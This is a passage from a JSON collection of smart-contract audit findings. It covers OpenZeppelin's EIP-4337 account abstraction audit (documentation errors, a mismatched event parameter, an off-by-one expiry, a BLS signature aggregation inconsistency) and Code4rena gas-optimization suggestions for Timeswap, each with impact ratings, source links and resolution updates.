[`SimpleAccount.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol)\n* [Line 23](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestAggregatedAccount.sol#L22-L23) in [`TestAggregatedAccount.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestAggregatedAccount.sol)\n* [Line 34](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestAggregatedAccount.sol#L33-L34) in [`TestAggregatedAccount.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestAggregatedAccount.sol)\n* [Line 16](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestSignatureAggregator.sol#L15-L16) in [`TestSignatureAggregator.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestSignatureAggregator.sol)\n* [Line 28](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestSignatureAggregator.sol#L26-L28) in [`TestSignatureAggregator.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestSignatureAggregator.sol)\n* [Line 43](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestSignatureAggregator.sol#L42-L43) in [`TestSignatureAggregator.sol`](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TestSignatureAggregator.sol)\n* [Line 40](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TokenPaymaster.sol#L37-L40) in [`TokenPaymaster.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/TokenPaymaster.sol)\n* [Line 6](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/utils/Exec.sol#L3-L6) in [`Exec.sol`](https://github.com/eth-infinitism/account-abstraction/tree/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/utils/Exec.sol)\n\n\nConsider thoroughly documenting all functions and their parameters, especially public APIs. When writing docstrings, consider following the [Ethereum Natural Specification Format](https://solidity.readthedocs.io/en/develop/natspec-format.html) (NatSpec).\n\n\n***Update:** Partially resolved in [pull request #212](https://github.com/eth-infinitism/account-abstraction/pull/212) and merged at commit [`eeb93b2`](https://github.com/eth-infinitism/account-abstraction/commit/eeb93b25804a748519245df34c4162fddf9a8fd1). The recommended changes to `GnosisAccountFactory.sol` were not implemented.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337 – Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10343",
      "title": "Mismatched event parameter [core]",
      "impact": "LOW",
      "content": "The `StakeLocked` event specifies a [`withdrawTime` parameter](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IStakeManager.sol#L26), but the argument passed in is the [new unstake delay](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/StakeManager.sol#L73). Consider renaming the event parameter to match its actual usage.\n\n\n***Update:** Resolved in [pull request #197](https://github.com/eth-infinitism/account-abstraction/pull/197) and merged at commit [`545a15c`](https://github.com/eth-infinitism/account-abstraction/commit/545a15cfdc793be375c2747ea90900612c00e077).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337 – Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10342",
      "title": "Misleading specification [core]",
      "impact": "LOW",
      "content": "The EIP [states](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/eip/EIPS/eip-4337.md?plain=1#L365) that when a `FailedOp` is detected, all other operations from the same paymaster should be removed from the current batch. However, this should only apply to `FailedOp` errors that explicitly mention the paymaster, which imply the paymaster was at fault. Operations that fail for unrelated reasons should not penalize their paymaster.\n\n\nThe EIP also [states](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/eip/EIPS/eip-4337.md?plain=1#L322) that `userOp` validation cannot call the `handleOps` method. This restriction should also apply to `handleAggregatedOps`.\n\n\nConsider clarifying these points in the EIP.\n\n\n***Update:** Partially resolved in [pull request #196](https://github.com/eth-infinitism/account-abstraction/pull/196) and merged at [`5929ff8`](https://github.com/eth-infinitism/account-abstraction/commit/5929ff80077e0e8dbf91c9ee234b73caa8d94bbc). The updated EIP mistakenly refers to the EntryPoint’s `depositTo` function as `depositFor`.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337 – Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10341",
      "title": "Incorrect or misleading documentation [core and samples]",
      "impact": "LOW",
      "content": "Several docstrings and inline comments throughout the code base were found to be incorrect or misleading. In particular:\n\n\n* In `BaseAccount.sol`:\n\t+ [Line 72](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/BaseAccount.sol#L72): The docstring defines `sigTimeRange` as “signature and time-range for this operation”, but it contains the signature validity, not the signature itself.\n* In `BLSSignatureAggregator.sol`:\n\t+ [Line 117](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol#L117): The docstring references a call to `simulateUserOperation`. The function name should be `simulateValidation`.\n* In `EIP4337Manager.sol`:\n\t+ [Line 21](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/gnosis/EIP4337Manager.sol#L21): The docstring states the contract inherits `GnosisSafeStorage`, but it actually inherits `GnosisSafe`.\n* In `EntryPoint.sol`:\n\t+ [Line 180](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L180): The comment does not include [`paymasterAndData`](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/UserOperation.sol#L30) as one of the dynamic byte arrays being excluded from `MemoryUserOp`.\n\t+ [Line 393](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L393): The docstring states that `_validatePaymasterPrepayment` validates that the paymaster is staked, but the function does not perform this check.\n* In `IPaymaster.sol`:\n\t+ [Lines 25-26](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IPaymaster.sol#L25-L26): The docstring states that the `validUntil` and `validAfter` timestamps are 4 bytes in length, but these are 8-byte (uint64) values.\n* In `IStakeManager.sol`:\n\t+ [Line 7](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IStakeManager.sol#L7), [lines 43-44](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IStakeManager.sol#L43-L44): Docstrings in this contract refer to staking only for paymasters, implying this is the only entity that should stake. Signature aggregators and factories are also required to stake following the same rules as paymasters.\n\t+ [Line 45](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IStakeManager.sol#L45): The docstring makes a reference to the “global unstakeDelaySec”, which no longer exists.\n\t+ [Line 47](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IStakeManager.sol#L47): The `DepositInfo` docstring explains that the variable sizes were chosen so that `deposit` and `staked` fit into a single `uint256` word, but the 3rd parameter `stake` will also fit.\n* In `SimpleAccount.sol`:\n\t+ [Line 52](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L52): The comment makes a reference to the `execFromEntryPoint` function, which no longer exists.\n\t+ [Line 57](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L57): The docstring for `execute` says “called directly from owner, not by entryPoint”, but the [`_requireFromEntryPointOrOwner`](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L60) function allows `execute` to be called by the EntryPoint. The comment isn’t clear on whether it is a suggestion, or a restriction to be enforced.\n\t+ [Lines 75-79](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L75-L79): The docstring does not match the `initialize` function.\n\t+ [Lines 89-96](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L89-L96): The docstring does not match the `_requireFromEntryPointOrOwner` function.\n* In `IEntryPoint.sol`:\n\t+ [Line 26](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/IEntryPoint.sol#L26): The `@success` parameter is listed in the wrong order.\n* In `UserOperation.sol`:\n\t+ [Line 25](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/interfaces/UserOperation.sol#L25): The `callGasLimit` parameter has no `@param` statement.\n\n\n***Update:** Resolved in [pull request #194](https://github.com/eth-infinitism/account-abstraction/pull/194) and [pull request #216](https://github.com/eth-infinitism/account-abstraction/pull/216), which were merged at commits [`faf305e`](https://github.com/eth-infinitism/account-abstraction/commit/faf305e3022ac7daa7cafb141ffe1dc1f936ee6c) and [`1f505c5`](https://github.com/eth-infinitism/account-abstraction/commit/1f505c5889b04a115b1bf09386c0b84cecdad5c4) respectively.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337 – Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10340",
      "title": "Imprecise time range [core]",
      "impact": "LOW",
      "content": "The `EntryPoint` contract [decrements the operation expiry timestamp](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L460) in order to convert `0` (which should be interpreted as “no expiry”) to the maximum `uint64` value. However, every other possible expiry value is now off by one. In the interest of predictability, consider only modifying the `0` timestamp.\n\n\n***Update:** Resolved in [pull request #193](https://github.com/eth-infinitism/account-abstraction/pull/193) and merged at commit [`973c0ac`](https://github.com/eth-infinitism/account-abstraction/commit/973c0ac1e54b2f5209e1c3ba2df8585ae27a7fa5).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337 – Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10339",
      "title": "Gnosis safe reverts on signature failure [samples]",
      "impact": "LOW",
      "content": "The [documentation](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L32-L33) for the `SIG_VALIDATION_FAILED` constant states that `validateUserOp` must return this value instead of reverting if signature validation fails. The `SimpleAccount` contract [correctly follows](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L110-L111) the specification, however in the `EIP4337Manager` contract, the `validateUserOp` function [reverts](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/gnosis/EIP4337Manager.sol#L45) if the signature validation fails. This means the [`simulateValidation` function](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L273) will revert without providing a `ValidationResult` object.\n\n\nConsider changing the logic so that `validateUserOp` returns `SIG_VALIDATION_FAILED` in all cases where an invalid signature is encountered.\n\n\n***Update:** Resolved in [pull request #181](https://github.com/eth-infinitism/account-abstraction/pull/181) and merged at commit [`1dfb173`](https://github.com/eth-infinitism/account-abstraction/commit/1dfb17366fb85598aadc8f4a5cb111d4ae159f26).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337 – Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10338",
      "title": "Accounts cannot replace EntryPoint [samples]",
      "impact": "LOW",
      "content": "The [comments](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/samples/SimpleAccount.sol#L76-L78) describing the `initialize` function of the `SimpleAccount` contract claim there should be a mechanism to replace the `EntryPoint` contract. This does not match the behavior of the function it describes, and in fact, there is no mechanism to replace the `EntryPoint` contract without upgrading the whole account.\n\n\nConsider updating the comment to match the behavior, and introducing a mechanism to replace the `EntryPoint` contract if that functionality is desired.\n\n\n***Update:** Resolved in [pull request #192](https://github.com/eth-infinitism/account-abstraction/pull/192) and merged at commit [`82685b2`](https://github.com/eth-infinitism/account-abstraction/commit/82685b233feaad7b63f2744137855e939f1146b6). A @dev comment was added to the docstring of the `initialize` function to clarify that the `_entryPoint` storage variable is not a parameter of the initializer because an upgrade is required to change the EntryPoint address.*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337 – Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10337",
      "title": "Invalid aggregate signature [samples]",
      "impact": "HIGH",
      "content": "The `BLSSignatureAggregator` exposes a mechanism to let the bundler [validate individual signatures](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol#L123) before constructing the bundle. Successful operations are grouped so the bundler can [combine their signatures](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol#L143) off-chain and the `EntryPoint` can [validate them together](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L142) on-chain. However, it is possible for an account to construct an operation that will pass the individual-signature check and still fail the combined-signature check.\n\n\nIn particular, if the public key it exposes [during the individual validation](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol#L126) is different from the one used [during the combined validation](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol#L60), the two validations will be inconsistent even though the signature is the same. This could occur if the [last 4 words of the `initCode`](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSSignatureAggregator.sol#L23) do not match the public key (because the `initCode` has additional data, or if they do not use the [expected creation function](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/bls/BLSAccountFactory.sol#L29)). It could also occur if the [user’s validation function](https://github.com/eth-infinitism/account-abstraction/blob/6dea6d8752f64914dd95d932f673ba0f9ff8e144/contracts/core/EntryPoint.sol#L135) (which is not invoked during the individual signature validation) changes the public key that is returned by `getBlsPublicKey`.\n\n\nIf a bundler constructs a bundle with these operations, it will be unable to validate the combined signature and will attribute the fault to the aggregator, which will cause the aggregator to be throttled and user operations with the same aggregator will not be processed.\n\n\nConsider synchronizing the two validation functions so they both use the same public key.\n\n\n***Update:** Resolved in [pull request #195](https://github.com/eth-infinitism/account-abstraction/pull/195) as well as commit [`268f103`](https://github.com/eth-infinitism/account-abstraction/pull/216/commits/268f103597c0406ba2595cf18d3d5a5473b9c7b9) of [pull request #216](https://github.com/eth-infinitism/account-abstraction/pull/216), which were merged at commits [`1cc1c97`](https://github.com/eth-infinitism/account-abstraction/commit/1cc1c97a00131a7922d1ccebd823e81e823b5d9f) and [`1f505c5`](https://github.com/eth-infinitism/account-abstraction/commit/1f505c5889b04a115b1bf09386c0b84cecdad5c4) respectively.*",
      "summary": "\nThis bug report is about the BLSSignatureAggregator component of the account-abstraction repository. This component is used to validate individual signatures before constructing a bundle, and to combine them off-chain and validate them together on-chain. The bug is that it is possible for an account to construct an operation that will pass the individual-signature check but fail the combined-signature check. This occurs if the public key used during individual validation is different from the one used during combined validation. This can be caused by the last 4 words of the initCode not matching the public key, or if they do not use the expected creation function, or if the user’s validation function changes the public key. If a bundler constructs a bundle with these operations, it will be unable to validate the combined signature and will attribute the fault to the aggregator, causing the aggregator to be throttled. The bug was resolved in pull request #195 and commit #268f103 of pull request #216, which were merged at commits #1cc1c97 and #1f505c5, respectively.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "EIP-4337 – Ethereum Account Abstraction Incremental Audit",
      "source_link": "https://blog.openzeppelin.com/eip-4337-ethereum-account-abstraction-incremental-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "24946",
      "title": "[G-27] Open the optimizer",
      "impact": "GAS",
      "content": "\nAlways use the Solidity optimizer to optimize gas costs. It's good practice to set the optimizer as high as possible until it no longer helps reduce gas costs in function calls. This is advisable since function calls are intended to be executed many more times than contract deployment, which only happens once.\n\nIn the light of this information, I suggest you to open the optimizer for ``v2-library``.\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24945",
      "title": "[G-26] Upgrade Solidity's optimizer",
      "impact": "GAS",
      "content": "\nMake sure Solidity’s optimizer is enabled. It reduces gas costs. If you want to gas optimize for contract deployment (costs less to deploy a contract) then set the Solidity optimizer at a low number. If you want to optimize for run-time gas costs (when functions are called on a contract) then set the optimizer to a high number.\n\nSet the optimization value higher than 800 in your hardhat.config.ts file.\n\n3 results - 3 files:\n```js\npackages\\v2-option\\hardhat.config.ts:\n  27: const config: HardhatUserConfig = {\n  28:   paths: {\n  29:     sources: \"./src\",\n  30:   },\n  31:   solidity: {\n  32:     version: \"0.8.8\",\n  33:     settings: {\n  34:       optimizer: {\n  35:         enabled: true,\n  36:         runs: 200,\n  37:       },\n  38:     },\n  39:   },\n```\n\n```js\npackages\\v2-pool\\hardhat.config.ts:\n  26: const config: HardhatUserConfig = {\n  27:   paths: {\n  28:     sources: \"./src\",\n  29:   },\n  30:   solidity: {\n  31:     version: \"0.8.8\",\n  32:     settings: {\n  33:       optimizer: {\n  34:         enabled: true,\n  35:         runs: 200,\n  36:       },\n  37:     },\n  38:   },\n```\n\n```js\npackages\\v2-token\\hardhat.config.ts:\n  26: const config: HardhatUserConfig = {\n  27:   paths: {\n  28:     sources: \"./src\",\n  29:   },\n  30:   solidity: {\n  31:     version: \"0.8.8\",\n  32:     settings: {\n  33:       optimizer: {\n  34:         enabled: true,\n  35:         runs: 200,\n  36:       },\n  37:     },\n  38:   },\n```\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24944",
      "title": "[G-25] Optimize names to save gas",
      "impact": "GAS",
      "content": "\nContracts most called functions could simply save gas by function ordering via ```Method ID```. Calling a function at runtime will be cheaper if the function is positioned earlier in the order (has a relatively lower Method ID) because ```22 gas``` are added to the cost of a function for every position that came before it. The caller can save on gas if you prioritize most called functions. \n\n**Context:** \n\nAll Contracts\n\n**Recommendation:** \n\nFind a lower ```method ID``` name for the most called functions for example Call() vs. Call1() is cheaper by ```22 gas```.\n\nFor example, the function IDs in the ```TimeswapV2Pool.sol``` contract will be the most used; A lower method ID may be given.\n\n**Proof of Concept:**\n\nhttps://medium.com/joyso/solidity-how-does-function-name-affect-gas-consumption-in-smart-contract-47d270d8ac92\n\nTimeswapV2Pool.sol function names can be named and sorted according to METHOD ID\n\n```js\nSighash   |   Function Signature\n========================\nfbddf051  =>  addPoolEnumerationIfNecessary(uint256,uint256)\n1ea3a4eb  =>  raiseGuard(uint256,uint256)\n3a9e8dd9  =>  lowerGuard(uint256,uint256)\nf4f89897  =>  blockTimestamp(uint96)\n2d883a73  =>  getByIndex(uint256)\n6f682a53  =>  numberOfPools()\n5c81c9b8  =>  hasLiquidity(uint256,uint256)\nb15044ac  =>  totalLiquidity(uint256,uint256)\na8f403b7  =>  sqrtInterestRate(uint256,uint256)\nf78333a3  =>  liquidityOf(uint256,uint256,address)\n647284f5  =>  feeGrowth(uint256,uint256)\n6c867790  =>  feesEarnedOf(uint256,uint256,address)\n72f8f85c  =>  protocolFeesEarned(uint256,uint256)\n7ffd3a70  =>  totalLongBalance(uint256,uint256)\n3a9d71e7  =>  totalLongBalanceAdjustFees(uint256,uint256)\n8fdc5c99  =>  totalPositions(uint256,uint256)\nc0e0c4c6  =>  transferLiquidity(uint256,uint256,address,uint160)\nd7e2c24a  =>  transferFees(uint256,uint256,address,uint256,uint256,uint256)\nad118b02  =>  initialize(uint256,uint256,uint160)\n47b46959  =>  collectProtocolFees(TimeswapV2PoolCollectParam)\n53fa956e  =>  collectTransactionFees(TimeswapV2PoolCollectParam)\n55e305f3  =>  collect(uint256,uint256,address,address,address,uint256,uint256,uint256)\n0150ca41  =>  mint(TimeswapV2PoolMintParam)\n6da9a2a4  =>  mint(TimeswapV2PoolMintParam,uint96)\ndf52795d  =>  mint(TimeswapV2PoolMintParam,bool,uint96)\n13576d77  =>  burn(TimeswapV2PoolBurnParam)\n731d4f67  =>  burn(TimeswapV2PoolBurnParam,uint96)\nbd4952bd  =>  burn(TimeswapV2PoolBurnParam,bool,uint96)\n5d0ea1f5  =>  deleverage(TimeswapV2PoolDeleverageParam)\n2e1b22ce  =>  deleverage(TimeswapV2PoolDeleverageParam,uint96)\ncde7bf11  =>  deleverage(TimeswapV2PoolDeleverageParam,bool,uint96)\na97a4f78  =>  leverage(TimeswapV2PoolLeverageParam)\n37aaeff8  =>  leverage(TimeswapV2PoolLeverageParam,uint96)\nb8be2a15  =>  leverage(TimeswapV2PoolLeverageParam,bool,uint96)\nc993c3fa  =>  rebalance(TimeswapV2PoolRebalanceParam)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Timeswap",
      "source_link": "https://code4rena.com/reports/2023-01-timeswap",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24943",
      "title": "[G-24] Avoid contract existence checks by using solidity version 0.8.10 or later",
      "impact": "GAS",
      "content": "\nPrior to 0.8.10 the compiler inserted extra code, including EXTCODESIZE (100 gas), to check for contract existence for external calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value\n\n57 results - 6 files:\n\n```solidity\npackages\\v2-token\\src\\TimeswapV2LiquidityToken.sol:\n   66:    amount = balanceOf(owner, _timeswapV2LiquidityTokenPositionIds[timeswapV2LiquidityTokenPosition.toKey()]);\n\n   71:    safeTransferFrom(from, to, _timeswapV2LiquidityTokenPositionIds[timeswapV2LiquidityTokenPosition.toKey()], liquidityAmount, bytes(\"\"));\n\n   81:    uint256 id = _timeswapV2LiquidityTokenPositionIds[position.toKey()];\n \n  109:    bytes32 key = timeswapV2LiquidityTokenPosition.toKey();\n  \n  153:    bytes32 key = TimeswapV2LiquidityTokenPosition({token0: param.token0, token1: param.token1, strike: param.strike, maturity: param.maturity}).toKey();\n \n  185:    bytes32 key = TimeswapV2LiquidityTokenPosition({token0: param.token0, token1: param.token1, strike: param.strike, maturity: param.maturity}).toKey();\n\n  125:    uint160 liquidityBalanceTarget = ITimeswapV2Pool(poolPair).liquidityOf(param.strike, param.maturity, address(this)) + param.liquidityAmount;\n\n  143:    Error.checkEnough(ITimeswapV2Pool(poolPair).liquidityOf(param.strike, param.maturity, address(this)), liquidityBalanceTarget);\n\n  125:    uint160 liquidityBalanceTarget = ITimeswapV2Pool(poolPair).liquidityOf(param.strike, param.maturity, address(this)) + param.liquidityAmount;\n\n  143:    Error.checkEnough(ITimeswapV2Pool(poolPair).liquidityOf(param.strike, param.maturity, address(this)), liquidityBalanceTarget);\n\n  131:    data = ITimeswapV2LiquidityTokenMintCallback(msg.sender).timeswapV2LiquidityTokenMintCallback(\n\n  163:    data = ITimeswapV2LiquidityTokenBurnCallback(msg.sender).timeswapV2LiquidityTokenBurnCallback(\n\n  160:    ITimeswapV2Pool(poolPair).transferLiquidity(param.strike, param.maturity, param.to, param.liquidityAmount);\n\n  193:    ITimeswapV2Pool(poolPair).transferFees(param.strike, param.maturity, param.to, long0Fees, long1Fees, shortFees);\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2LiquidityToken.sol#L66\n\n```solidity\npackages\\v2-token\\src\\TimeswapV2Token.sol:\n   67:    amount = ERC1155.balanceOf(owner, _timeswapV2TokenPositionIds[timeswapV2TokenPosition.toKey()]);\n\n   72:    safeTransferFrom(from, to, _timeswapV2TokenPositionIds[timeswapV2TokenPosition.toKey()], (amount), bytes(\"\"));\n\n   97:    bytes32 key = timeswapV2TokenPosition.toKey();\n  \n  127:    bytes32 key = timeswapV2TokenPosition.toKey();\n \n  156:    bytes32 key = timeswapV2TokenPosition.toKey();\n  \n  240:    _burn(msg.sender, _timeswapV2TokenPositionIds[timeswapV2TokenPosition.toKey()], param.long0Amount);\n\n  254:    _burn(msg.sender, _timeswapV2TokenPositionIds[timeswapV2TokenPosition.toKey()], param.long1Amount);\n\n  268:    _burn(msg.sender, _timeswapV2TokenPositionIds[timeswapV2TokenPosition.toKey()], param.shortAmount);\n\n   87:    long0BalanceTarget = ITimeswapV2Option(optionPair).positionOf(param.strike, param.maturity, address(this), TimeswapV2OptionPosition.Long0) + param.long0Amount;\n\n  117:    long1BalanceTarget = ITimeswapV2Option(optionPair).positionOf(param.strike, param.maturity, address(this), TimeswapV2OptionPosition.Long1) + param.long1Amount;\n\n  146:    shortBalanceTarget = ITimeswapV2Option(optionPair).positionOf(param.strike, param.maturity, address(this), TimeswapV2OptionPosition.Short) + param.shortAmount;\n\n  186:    if (param.long0Amount != 0) Error.checkEnough(ITimeswapV2Option(optionPair).positionOf(param.strike, param.maturity, address(this), TimeswapV2OptionPosition.Long0), long0BalanceTarget);\n\n  189:    if (param.long1Amount != 0) Error.checkEnough(ITimeswapV2Option(optionPair).positionOf(param.strike, param.maturity, address(this), TimeswapV2OptionPosition.Long1), long1BalanceTarget);\n\n  192:    if (param.shortAmount != 0) Error.checkEnough(ITimeswapV2Option(optionPair).positionOf(param.strike, param.maturity, address(this), TimeswapV2OptionPosition.Short), shortBalanceTarget);\n```\n\nhttps://github.com/code-423n4/2023-01-timeswap/blob/main/packages/v2-token/src/TimeswapV2Token.sol#L67\n\n```solidity\npackages\\v2-pool\\src\\TimeswapV2Pool.sol:\n  189:    ITimeswapV2PoolFactory(poolFactory).owner().checkIfOwner();\n\n  267:    if (long0Amount != 0) long0BalanceTarget = ITimeswapV2Option(optionPair).positionOf(param.strike, param.maturity, address(this), TimeswapV2OptionPosition.Long0) + long0Amount;\n  \n  271:    if (long1Amount != 0) long1BalanceTarget = ITimeswapV2Option(optionPair).positionOf(param.strike, 